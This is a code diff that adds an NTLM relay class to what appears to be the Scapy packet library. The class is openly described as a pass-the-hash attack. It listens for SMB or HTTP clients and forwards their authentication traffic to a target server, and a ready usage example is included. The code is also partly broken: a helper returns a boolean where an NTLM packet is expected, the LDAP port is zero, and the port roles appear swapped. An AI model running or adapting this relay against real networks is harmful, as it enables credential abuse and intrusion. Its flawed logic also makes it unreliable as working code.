@@ -9,7 +9,10 @@ NTLM
 https://winprotocoldoc.blob.core.windows.net/productionwindowsarchives/MS-NLMP/%5bMS-NLMP%5d.pdf
 """
 
+import socket
 import struct
+
+from scapy.ansmachine import AnsweringMachineTCP
 from scapy.compat import bytes_base64
 from scapy.config import conf
 from scapy.fields import (
@@ -38,6 +41,7 @@ from scapy.fields import (
 )
 from scapy.packet import Packet
 from scapy.sessions import StringBuffer
+from scapy.supersocket import StreamSocket
 
 from scapy.compat import (
     Any,
@@ -470,3 +474,124 @@ def HTTP_ntlm_negotiate(ntlm_negotiate):
     return HTTP() / HTTPRequest(
         Authorization=b"NTLM " + bytes_base64(bytes(ntlm_negotiate))
     )
+
+# Answering machine
+
+class NTLM_Relay(AnsweringMachineTCP):
+    """
+    NTLM Relay
+
+    This class aims at implementing a simple pass-the-hash attack across
+    various protocols.
+
+    Usage example:
+        ntlm_relay(ServerIP="192.168.122.156",
+                   ServerProto=NTLM_Relay.PROTO.SMB,
+                   ClientProto=NTLM_Relay.PROTO.SMB,
+                   iface="eth0")
+    
+    :param ServerIP: the address IP of the server to connect to for auth
+    :param ServerProto: the proto to connect to the server into
+    :param ClientProto: what the relay is listening to
+    """
+    function_name = "ntlm_relay"
+
+    class PROTO:
+        SMB = 0
+        HTTP = 1
+        LDAP = 2
+
+    def parse_options(self, ServerProto=None,
+                            ServerIP=None,
+                            ClientProto=None,
+                            timeout=None):
+        if ServerIP is None:
+            raise ValueError("Specify ServerIP !")
+        if ServerProto is None:
+            raise ValueError("Specify ServerProto !")
+        if ClientProto is None:
+            raise ValueError("Specify ClientProto !")
+        self.ServerIP = ServerIP
+        self.timeout = timeout
+        self.ServerProto = ServerProto
+        self.ClientProto = ClientProto
+        self.sessions = {}
+        from scapy.layers.netbios import NBTSession
+        from scapy.layers.http import HTTP
+        ports = {
+            self.PROTO.SMB: (445, NBTSession),
+            self.PROTO.HTTP: (80, HTTP),
+            self.PROTO.LDAP: (0, conf.raw_layer),
+        }
+        self.port, self.cls = ports[self.ServerProto]
+        self.clientport, self.clientcls = ports[self.ClientProto]
+        print("NTLM relay %s -> %s" % (self.port, self.clientport))
+
+    def is_request(self, req):
+        """
+        Returns whether a packet should be considered as a request, based
+        on the server proto.
+        """
+        if self.ServerProto == self.PROTO.SMB:
+            from scapy.layers.smb import SMB_Header
+            return SMB_Header in req
+        elif self.ServerProto == self.PROTO.HTTP:
+            from scapy.layers.http import HTTPRequest
+            return HTTPRequest in req
+
+    def get_ntlm_content(self, req):
+        """
+        Returns the NTLM packet based on the server request.
+        """
+        if self.ServerProto == self.PROTO.SMB:
+            from scapy.layers.smb import SMB_Header
+            return SMB_Header in req
+        elif self.ServerProto == self.PROTO.HTTP:
+            from scapy.layers.http import HTTPRequest
+            return HTTPRequest in req
+
+    def get_request(self, req):
+        """
+        Returns what to send the server based on the client request.
+        """
+        ntlm = self.get_ntlm_content(req)
+
+        if self.ServerProto == self.PROTO.SMB:
+            return req
+        elif self.ServerProto == self.PROTO.HTTP:
+            return req
+
+    def get_reply(self, resp):
+        """
+        Returns what to send the client based on the server response.
+        """
+        ntlm = self.get_ntlm_content(resp)
+
+        if self.ClientProto == self.PROTO.SMB:
+            return resp
+        elif self.ClientProto == self.PROTO.HTTP:
+            return resp
+
+    def make_reply(self, req, address=None):
+        if address not in self.sessions:
+            # Connect to real server
+            _sock = socket.socket()
+            _sock.connect(
+                (self.ServerIP, self.clientport)
+            )
+            sock = StreamSocket(_sock, self.clientcls)
+            self.sessions[address] = {
+                "socket": sock,
+                "data": {}
+            }
+        else:
+            sock = self.sessions[address]["socket"]
+        req = self.get_request(req)
+        # Relay
+        resp = sock.sr1(req, timeout=self.timeout, verbose=False)
+        if resp:
+            return self.get_reply(resp)
+
+    def close(self):
+        for session in self.sessions.values():
+            session["socket"].close()
